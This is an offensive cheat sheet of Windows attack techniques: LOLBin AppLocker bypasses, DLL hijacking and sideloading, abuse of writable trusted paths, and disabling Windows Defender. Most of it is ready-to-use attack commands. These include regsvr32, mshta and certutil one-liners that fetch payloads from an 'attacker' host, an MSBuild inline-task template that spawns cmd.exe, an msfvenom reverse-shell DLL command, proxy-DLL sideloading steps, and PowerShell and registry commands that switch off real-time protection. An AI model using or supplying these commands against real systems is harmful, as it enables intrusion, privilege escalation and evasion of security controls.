# LOLBins / AppLocker Bypass / DLL Hijacking

## AppLocker Bypass via LOLBins

AppLocker default rules allow anything under `C:\Windows\`. These binaries execute arbitrary code.

| Binary | Command | Notes |
|--------|---------|-------|
| regsvr32 | `regsvr32 /s /n /u /i:http://attacker/shell.sct scrobj.dll` | COM scriptlet, no proxy aware |
| mshta | `mshta.exe http://attacker/shell.hta` | HTA file execution |
| certutil | `certutil -urlcache -split -f http://attacker/shell.exe shell.exe` | Download only, not exec |
| InstallUtil | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U shell.dll` | Runs Uninstall() method |
| MSBuild | `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe shell.csproj` | Inline task execution |
| Regsvcs/Regasm | `regsvcs.exe malicious.dll` / `regasm.exe malicious.dll` | COM registration |
| rundll32 | `rundll32.exe javascript:"\..\mshtml,RunHTMLApplication "` | JS execution |
| wmic | `wmic process call create "cmd.exe /c whoami"` | Process creation |
| odbcconf | `odbcconf.exe /a {REGSVR malicious.dll}` | DLL registration |

**MSBuild inline task template**
```xml
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="Run">
    <ClassExample />
  </Target>
  <UsingTask TaskName="ClassExample" TaskFactory="CodeTaskFactory"
    AssemblyFile="$(MSBuildToolsPath)\Microsoft.Build.Tasks.v4.0.dll">
    <Task>
      <Code Type="Class" Language="cs"><![CDATA[
        using System;
        using Microsoft.Build.Framework;
        using Microsoft.Build.Utilities;
        public class ClassExample : Task, ITask {
          public override bool Execute() {
            System.Diagnostics.Process.Start("cmd.exe");
            return true;
          }
        }
      ]]></Code>
    </Task>
  </UsingTask>
</Project>
```

---

## DLL Hijacking (service/application privilege escalation)

```
1. Use Process Monitor: filter on "NAME NOT FOUND" + ".dll" extension
2. Identify DLL loaded from user-writable path
3. Generate malicious DLL:
   msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=4444 -f dll -o malicious.dll
4. Place in search-order path before legitimate location
5. Trigger: restart service / re-launch application
```

**Common hijack targets** (writable path before System32):
- `version.dll`, `dwmapi.dll`, `uxtheme.dll`
- Application-local directories with missing DLLs

---

## DLL Sideloading (signed binary loads malicious DLL)

```
1. Find legitimate signed binary that loads a DLL without absolute path
   procmon.exe → filter: "Process Name is legit_app.exe" + "NAME NOT FOUND"
2. Create proxy DLL (export original functions, add malicious payload):
   #pragma comment(linker, "/export:ExportedFunc=original.dll.ExportedFunc")
3. Place malicious DLL alongside signed binary in user-writable location
4. Execute signed binary — Windows loads your DLL (trusted context)
```

**Example**: `OneDriveSetup.exe` loads `version.dll` from local dir → place malicious version.dll

---

## AppLocker Writeable Path Abuse

```powershell
# Find user-writable directories under AppLocker-trusted paths
Get-AppLockerPolicy -Effective | Select-Xml -XPath "//FilePathRule" |
  ForEach-Object { $_.Node.Conditions.FilePathCondition.Path }

# Common writable + trusted locations:
# C:\Windows\Tasks\
# C:\Windows\Temp\
# C:\Windows\tracing\
# C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys\
```

---

## Disable Windows Defender Real-Time (admin required)

```powershell
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableIOAVProtection $true
Add-MpPreference -ExclusionPath "C:\temp"

# Or via registry:
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
```
